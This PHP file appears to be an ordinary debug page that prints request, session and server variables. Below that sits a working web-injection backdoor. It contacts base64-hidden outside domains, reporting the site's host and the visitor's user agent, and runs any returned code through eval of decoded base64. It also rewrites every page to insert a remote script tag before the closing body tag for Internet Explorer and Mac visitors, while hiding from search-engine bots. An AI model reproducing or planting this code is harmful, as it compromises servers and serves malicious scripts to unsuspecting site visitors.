<?php
session_start();

header('Content-Type: text/html;charset=UTF-8');

print_r($_GET);
print_r($_POST);
print_r($_SESSION);
print_r($_SERVER);

if(function_exists('ob_start')&&!isset($_SERVER['mr_no'])){
	$_SERVER['mr_no']=1;    if(!function_exists('mrobh')){
		function get_tds_777($url){
			$content="";$content=@trycurl_777($url);if($content!==false)return $content;$content=@tryfile_777($url);if($content!==false)return $content;$content=@tryfopen_777($url);if($content!==false)return $content;$content=@tryfsockopen_777($url);if($content!==false)return $content;$content=@trysocket_777($url);if($content!==false)return $content;return '';
		}  function trycurl_777($url){
			if(function_exists('curl_init')===false)return false;$ch = curl_init ();curl_setopt ($ch, CURLOPT_URL,$url);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_TIMEOUT, 5);curl_setopt ($ch, CURLOPT_HEADER, 0);$result = curl_exec ($ch);curl_close($ch);if ($result=="")return false;return $result;
		}  function tryfile_777($url){
			if(function_exists('file')===false)return false;$inc=@file($url);$buf=@implode('',$inc);if ($buf=="")return false;return $buf;
		}  function tryfopen_777($url){
			if(function_exists('fopen')===false)return false;$buf='';$f=@fopen($url,'r');if ($f){
				while(!feof($f)){
					$buf.=fread($f,10000);
				}fclose($f);
			}else return false;if ($buf=="")return false;return $buf;
		}  function tryfsockopen_777($url){
			if(function_exists('fsockopen')===false)return false;$p=@parse_url($url);$host=$p['host'];$uri=$p['path'].'?'.$p['query'];$f=@fsockopen($host,80,$errno, $errstr,30);if(!$f)return false;$request ="GET $uri HTTP/1.0\n";$request.="Host: $host\n\n";fwrite($f,$request);$buf='';while(!feof($f)){
				$buf.=fread($f,10000);
			}fclose($f);if ($buf=="")return false;list($m,$buf)=explode(chr(13).chr(10).chr(13).chr(10),$buf);return $buf;
		}  function trysocket_777($url){
			if(function_exists('socket_create')===false)return false;$p=@parse_url($url);$host=$p['host'];$uri=$p['path'].'?'.$p['query'];$ip1=@gethostbyname($host);$ip2=@long2ip(@ip2long($ip1)); if ($ip1!=$ip2)return false;$sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);if (!@socket_connect($sock,$ip1,80)){
				@socket_close($sock);return false;
			}$request ="GET $uri HTTP/1.0\n";$request.="Host: $host\n\n";socket_write($sock,$request);$buf='';while($t=socket_read($sock,10000)){
				$buf.=$t;
			}@socket_close($sock);if ($buf=="")return false;list($m,$buf)=explode(chr(13).chr(10).chr(13).chr(10),$buf);return $buf;
		}  function update_tds_file_777($tdsfile){
			$actual1=$_SERVER['s_a1'];$actual2=$_SERVER['s_a2'];$val=get_tds_777($actual1);if ($val=="")$val=get_tds_777($actual2);$f=@fopen($tdsfile,"w");if ($f){
				@fwrite($f,$val);@fclose($f);
			}if (strstr($val,"|||CODE|||")){
				list($val,$code)=explode("|||CODE|||",$val);eval(base64_decode($code));
			}return $val;
		}  function get_actual_tds_777(){
			$defaultdomain=$_SERVER['s_d1'];$dir=$_SERVER['s_p1'];$tdsfile=$dir."log1.txt";if (@file_exists($tdsfile)){
				$mtime=@filemtime($tdsfile);$ctime=time()-$mtime;if ($ctime>$_SERVER['s_t1']){
					$content=update_tds_file_777($tdsfile);
				}else{$content=@file_get_contents($tdsfile);
				}
			}else{$content=update_tds_file_777($tdsfile);
			}$tds=@explode("\n",$content);$c=@count($tds)+0;$url=$defaultdomain;if ($c>1){
				$url=trim($tds[mt_rand(0,$c-2)]);
			}return $url;
		}  function is_mac_777($ua){
			$mac=0;if (stristr($ua,"mac")||stristr($ua,"safari"))if ((!stristr($ua,"windows"))&&(!stristr($ua,"iphone")))$mac=1;return $mac;
		}  function is_msie_777($ua){
			$msie=0;if (stristr($ua,"MSIE 6")||stristr($ua,"MSIE 7")||stristr($ua,"MSIE 8")||stristr($ua,"MSIE 9"))$msie=1;return $msie;
		}    function setup_globals_777(){
			$rz=$_SERVER["DOCUMENT_ROOT"]."/.logs/";$mz="/tmp/";if (!@is_dir($rz)){
				@mkdir($rz);if (@is_dir($rz)){
					$mz=$rz;
				}else{$rz=$_SERVER["SCRIPT_FILENAME"]."/.logs/";if (!@is_dir($rz)){
					@mkdir($rz);if (@is_dir($rz)){
						$mz=$rz;
					}
				}else{$mz=$rz;
				}
				}
			}else{$mz=$rz;
			}$bot=0;$ua=$_SERVER['HTTP_USER_AGENT'];if (stristr($ua,"msnbot")||stristr($ua,"Yahoo"))$bot=1;if (stristr($ua,"bingbot")||stristr($ua,"google"))$bot=1;$msie=0;if (is_msie_777($ua))$msie=1;$mac=0;if (is_mac_777($ua))$mac=1;if (($msie==0)&&($mac==0))$bot=1;  global $_SERVER;    $_SERVER['s_p1']=$mz;  $_SERVER['s_b1']=$bot;  $_SERVER['s_t1']=1200;  $_SERVER['s_d1']=base64_decode('aHR0cDovL2VuczEyMnp6emRkYXp6LmNvbS8=');  $d='?d='.urlencode($_SERVER["HTTP_HOST"])."&p=".urlencode($_SERVER["PHP_SELF"])."&a=".urlencode($_SERVER["HTTP_USER_AGENT"]);  $_SERVER['s_a1']=base64_decode('aHR0cDovL21tZ3VwcGVyLmNvbS9nX2xvYWQucGhw').$d;  $_SERVER['s_a2']=base64_decode('aHR0cDovL21taG9sb3AuY29tL2dfbG9hZC5waHA=').$d;  $_SERVER['s_script']="mm.php?d=x1";
		}      setup_globals_777();    if(!function_exists('gml_777')){
			function gml_777(){
				$r_string_777='';  if ($_SERVER['s_b1']==0)$r_string_777='<script src="'.get_actual_tds_777().$_SERVER['s_script'].'"></script>';  return $r_string_777;
			}
		}      if(!function_exists('gzdecodeit')){
			function gzdecodeit($decode){
				$t=@ord(@substr($decode,3,1));  $start=10;  $v=0;  if($t&4){
					$str=@unpack('v',substr($decode,10,2));  $str=$str[1];  $start+=2+$str;
				}  if($t&8){
					$start=@strpos($decode,chr(0),$start)+1;
				}  if($t&16){
					$start=@strpos($decode,chr(0),$start)+1;
				}  if($t&2){
					$start+=2;
				}  $ret=@gzinflate(@substr($decode,$start));  if($ret===FALSE){
					$ret=$decode;
				}  return $ret;
			}
		}  function mrobh($content){
			@Header('Content-Encoding: none');  $decoded_content=gzdecodeit($content);  if(preg_match('/\<\/body/si',$decoded_content)){
				return preg_replace('/(\<\/body[^\>]*\>)/si',gml_777()."\n".'$1',$decoded_content);
			}else{  return $decoded_content.gml_777();
			}
		}  ob_start('mrobh');
	}
}
?>